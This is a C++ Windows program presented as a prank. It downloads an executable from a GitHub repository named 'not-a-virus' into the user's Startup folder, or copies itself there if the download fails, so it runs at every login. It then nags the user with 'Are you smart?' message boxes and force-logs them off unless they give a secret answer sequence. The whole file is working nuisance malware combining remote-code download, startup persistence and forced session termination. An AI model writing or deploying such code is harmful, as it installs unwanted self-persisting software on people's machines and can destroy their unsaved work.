#define UNICODE
#include <iostream>
#include <windows.h>
#include <winbase.h>
#include <urlmon.h>

unsigned amount;
bool downShut;
bool quitNormally;

void DownloadFile(std::string path, char** argv) {
    if (URLDownloadToFileA(NULL, (LPCSTR)"https://raw.githubusercontent.com/ethanaobrien/not-a-virus/main/application.exe", path.c_str(), 0, NULL) != S_OK) {
        CopyFileA((LPCSTR)argv[0], path.c_str(), false);
    }
}

void ShutDown() {
    downShut = true;
    ExitWindowsEx(EWX_FORCE | EWX_LOGOFF, SHTDN_REASON_MAJOR_APPLICATION | SHTDN_REASON_MINOR_UNSTABLE);
}

int yes() {
    if (downShut) return false;
    int msgboxID = MessageBox(NULL,
                              (LPCWSTR)L"Are you smart?",
                              (LPCWSTR)L"Question",
                              MB_YESNO);
    
    if (amount == 3 && msgboxID == IDNO) {
        quitNormally = true;
        return false;
    }
    
    if (amount > 10 && msgboxID != IDNO) {
        MessageBox(NULL, (LPCWSTR)L"Say Goodbye", (LPCWSTR)L"", MB_OK);
        ShutDown();
        return true;
    }
    amount++;
    return msgboxID != IDNO;
}

int main(int argc, char** argv)
{
    char username[100];
    DWORD username_len = 100;
    GetUserNameA(username, &username_len);
    std::string UserName = username;
    std::string pathOut = "C:\\\\Users\\" + UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\yes.exe";
    remove(pathOut.c_str());
    DownloadFile(pathOut, argv);
    
    downShut = false;
    amount = 0;
    while (yes());
    
    if (quitNormally) {
        MessageBox(NULL, (LPCWSTR)L"Wow. You know the secret code.", (LPCWSTR)L"", MB_OK);
        MessageBox(NULL, (LPCWSTR)L"I guess you are kinda smart.", (LPCWSTR)L"", MB_OK);
        return 0;
    }
    
    if (!downShut) {
        MessageBox(NULL,
          (LPCWSTR)L"It shows :)",
          (LPCWSTR)L"",
          MB_OK);
        MessageBox(NULL, (LPCWSTR)L"Bye bye", (LPCWSTR)L"", MB_OK);
        ShutDown();
    }
    return 0;
}
